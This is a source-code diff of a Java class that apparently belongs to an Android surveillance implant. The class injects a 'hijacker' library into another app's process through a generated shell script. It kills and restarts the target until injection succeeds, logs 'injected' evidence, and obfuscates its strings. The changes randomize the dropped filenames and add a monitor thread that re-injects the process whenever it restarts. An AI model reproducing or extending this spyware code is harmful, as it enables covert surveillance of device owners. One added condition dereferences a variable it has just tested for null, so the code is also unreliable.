@@ -25,7 +25,7 @@ public class Instrument {
 	private String proc;
 	private PidMonitor pidMonitor;
 	private String lib_dest, hijacker, path, dumpPath, pidCompletePath, pidFile, dexFile, libInAsset;
-	private boolean stopMonitor = false;
+
 	private Semaphore sync_semaphore =null;
 	private Thread monitor;
 	private int killed = 0;
@@ -39,7 +39,7 @@ public class Instrument {
 
 		proc = process;
 		proc_owner = owner;
-		hijacker = "m";
+		hijacker = String.valueOf(Math.abs((int)Utils.getRandom()))+"m";
 		libInAsset = library;
 		lib_dest = String.valueOf(Math.abs((int)Utils.getRandom()));
 		path = filesPath.getAbsolutePath();
@@ -130,18 +130,23 @@ public class Instrument {
 		}
 		Date start = new Date();
 		long diff_sec = 0;
-		while(diff_sec<timeout) {
+		while(diff_sec<timeout && killed < MAX_KILLED) {
 			if( _startInstrumentation()  ){
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "(startInstrumentation): Done");
+					Check.log(TAG + "(startInstrumentation): "+ proc +" Done");
 				}
-				return true;
+				break;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(startInstrumentation): "+proc+" failed, try again");
 			}
 			Utils.sleep(500);
 			diff_sec = (new Date().getTime() - start.getTime()) / 1000;
 		}
-		if (Cfg.DEBUG) {
-			Check.log(TAG + "(startInstrumentation): Time out sec="+timeout);
+		if(diff_sec>timeout) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(startInstrumentation): " + proc + "Time out sec=" + timeout);
+			}
 		}
 
 		return isStarted();
@@ -155,7 +160,12 @@ public class Instrument {
 
 			return false;
 		}
-
+		if(killed > MAX_KILLED){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(_startInstrumentation): too many trials");
+			}
+			return false;
+		}
 		if (!installHijacker()) {
 			return false;
 		}
@@ -168,7 +178,7 @@ public class Instrument {
 
 					if (pid > 0) {
 						// Run the injector
-						String scriptName = "ij";
+						String scriptName = String.valueOf(Math.abs((int)Utils.getRandom()))+"ij";
 						String script = M.e("#!/system/bin/sh") + "\n";
 						script += M.e("rm ")+ getInstrumentationSuccessDir() +M.e("*.cnf") + "\n";
 						if( StringUtils.isEmpty(dexFile)) {
@@ -223,43 +233,23 @@ public class Instrument {
 								Utils.sleep(1000);
 							}
 						}
-
-						if (!started && killed < MAX_KILLED) {
+						if (started) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (_startInstrumentation) "+proc+" Hijack installed");
+							}
+							EvidenceBuilder.info(proc + M.e(" injected"));
+							checkProcessMonitor(true);
+						}else if ( killed < MAX_KILLED) {
 							if (Cfg.DEBUG) {
 								Check.log(TAG + " (_startInstrumentation) Kill "+proc);
 							}
 							killProc(proc);
-							// Utils.sleep(1000);
-							// newpid = getProcessPid();
 							killed += 1;
-
-							if (started) {
-								if (Cfg.DEBUG) {
-									Check.log(TAG + " (_startInstrumentation) "+proc+" Hijack installed");
-								}
-								EvidenceBuilder.info(proc + M.e(" injected"));
-							}
-
-							stopMonitor = false;
-						}
-
-						if (pidMonitor == null) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + " (_startInstrumentation) script: \n" + script);
-								Check.log(TAG + "(_startInstrumentation): Starting "+proc+ " Monitor thread");
-							}
-
-							pidMonitor = new PidMonitor(newpid);
-							monitor = new Thread(pidMonitor);
-							monitor.start();
-						} else {
-							pidMonitor.setPid(newpid);
 						}
 					} else {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + "(_startInstrumentation): unable to get pid for "+ proc);
 						}
-
 					}
 				} catch (Exception e) {
 					if (Cfg.DEBUG) {
@@ -283,15 +273,17 @@ public class Instrument {
 			return false;
 		}
 
-		return true;
+		return started;
 	}
 
 	public void stopInstrumentation() {
-		stopMonitor = true;
-		monitor = null;
+
 		int trials=MAX_KILLED;
 		int pid_start = getProcessPid(proc,proc_owner);
 		int pid_stop = pid_start;
+		if ( pidMonitor != null ){
+			pidMonitor.setStopMonitor(true);
+		}
 
 		while(trials-->0 && pid_start==pid_stop) {
 			if (Cfg.DEBUG) {
@@ -321,6 +313,7 @@ public class Instrument {
 		if(pid_start != pid_stop){
 			started = false;
 		}
+		monitor = null;
 	}
 
 	private int getProcessPid(String process,String proc_owner) {
@@ -379,9 +372,49 @@ public class Instrument {
 		}
 	}
 
+	public void checkProcessMonitor(boolean initialize) {
+		int newpid = 0;
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(checkProcessMonitor): initialize " + initialize);
+		}
+		if (initialize ) {
+			newpid = getProcessPid(proc, proc_owner);
+		}
+		if (pidMonitor == null) {
+			newpid = getProcessPid(proc, proc_owner);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(checkProcessMonitor): Starting "+proc+ " Monitor thread");
+			}
+			pidMonitor = new PidMonitor(newpid);
+			monitor = new Thread(pidMonitor);
+			monitor.start();
+		} else {
+			if( initialize) {
+				pidMonitor.setPid(newpid);
+			}else{
+				if( monitor ==null && monitor.getState() == Thread.State.TERMINATED ){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(checkProcessMonitor): pid not null but thread terminated ! set is to null");
+					}
+					pidMonitor.setStopMonitor(false);
+					pidMonitor.setPid(newpid);
+					monitor = new Thread(pidMonitor);
+					monitor.start();
+				}
+			}
+
+		}
+	}
+
 	class PidMonitor implements Runnable {
 		private int cur_pid, start_pid;
 		private int failedCounter = 0;
+		private int restartedCounter = 0;
+		private boolean stopMonitor = false;
+
+		public void setStopMonitor(boolean stopMonitor) {
+			this.stopMonitor = stopMonitor;
+		}
 
 		public void setPid(int pid) {
 			start_pid = pid;
@@ -389,19 +422,22 @@ public class Instrument {
 
 		public PidMonitor(int pid) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(PidMonitor): starting with pid " + pid);
+				Check.log(TAG + "(PidMonitor): starting with pid " + pid + "for proc=" + proc);
 			}
-
+			stopMonitor = false;
 			setPid(pid);
 		}
 
 		@Override
 		public void run() {
 			while (true) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(PidMonitor "+ proc +" run): killed="+ killed +" restarted="+ restartedCounter);
+				}
 
 				if (stopMonitor) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "(PidMonitor run): closing monitor thread");
+						Check.log(TAG + "(PidMonitor "+proc+" run): closing monitor thread");
 					}
 
 					stopMonitor = false;
@@ -413,15 +449,16 @@ public class Instrument {
 				// process died
 				if (cur_pid != start_pid) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "(PidMonitor run): "+ proc +" died, restarting instrumentation");
+						Check.log(TAG + "(PidMonitor "+proc+" run): died, restarting instrumentation");
 					}
 
 					failedCounter += 1;
-					if (failedCounter < 3) {
+					if (failedCounter < MAX_KILLED) {
 						startInstrumentation();
+						restartedCounter++;
 					} else {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (run) too many retry, stop restarting "+ proc);
+							Check.log(TAG + "(PidMonitor "+proc+" run): too many retry, stop restarting ");
 						}
 					}
 				} else {
